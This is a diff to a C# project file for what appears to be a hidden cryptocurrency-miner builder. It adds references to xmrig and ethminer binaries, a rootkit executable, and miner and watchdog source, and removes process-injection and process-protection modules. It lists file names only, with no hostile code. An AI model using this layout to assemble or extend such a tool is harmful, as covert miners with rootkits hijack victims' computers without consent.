@@ -163,25 +163,26 @@
       <DesignTime>True</DesignTime>
       <DependentUpon>Resources.resx</DependentUpon>
     </Compile>
+    <None Include="Resources\Rootkit\rootkit-i.exe" />
+    <None Include="Resources\Miners\nvrtc-builtins64_112.dll" />
+    <None Include="Resources\Miners\nvrtc64_112_0.dll" />
+    <None Include="Resources\Miners\ddb64.dll" />
+    <None Include="Resources\Miners\xmrig.exe" />
+    <None Include="Resources\Miners\ethminer.exe" />
     <None Include="Resources\Code\Checker.cs" />
+    <None Include="Resources\Code\Files.zip" />
+    <None Include="Resources\Code\miner.cpp" />
+    <None Include="Resources\Code\watchdog.cpp" />
     <Content Include="Resources\LocalizedControls.xml" />
-    <None Include="Resources\Modules\ProcessProtect.dll" />
-    <None Include="Resources\Modules\ProcessInject.dll" />
-    <None Include="Resources\Modules\DllLoader.dll" />
     <None Include="Resources\Compilers\resource.rcf" />
     <None Include="Resources\Compilers\template.manifest-miner" />
-    <None Include="Resources\Rootkit\rootkit-i.zip" />
     <None Include="Resources\Rootkit\rootkit-u.zip" />
     <None Include="Program\app.config" />
     <None Include="Program\app.manifest">
       <SubType>Designer</SubType>
     </None>
     <None Include="Resources\Compilers\Compilers.zip" />
-    <None Include="Resources\Miners\ethminer.zip" />
-    <None Include="Resources\Compilers\Includes.zip" />
-    <None Include="Resources\Miners\libs.zip" />
     <Compile Include="Classes\Theme.cs" />
-    <None Include="Resources\Miners\xmrig.zip" />
   </ItemGroup>
   <ItemGroup>
     <EmbeddedResource Include="Forms\AdvancedOptions.resx">
@@ -222,18 +223,11 @@
     <None Include="Resources\Miners\WinRing0x64.sys" />
   </ItemGroup>
   <ItemGroup>
-    <None Include="Resources\Code\Program.cs" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\Code\Watchdog.cs" />
-  </ItemGroup>
-  <ItemGroup>
     <None Include="Resources\Images\microsoft-admin.png" />
     <None Include="Resources\Images\Ethereum.ico" />
     <None Include="Resources\Images\Ethereum.png" />
     <None Include="Resources\Images\icon.png" />
     <None Include="Resources\Images\icon.ico" />
-    <None Include="Resources\Code\Loader.c" />
     <None Include="Resources\Code\Uninstaller.cs" />
   </ItemGroup>
   <ItemGroup>
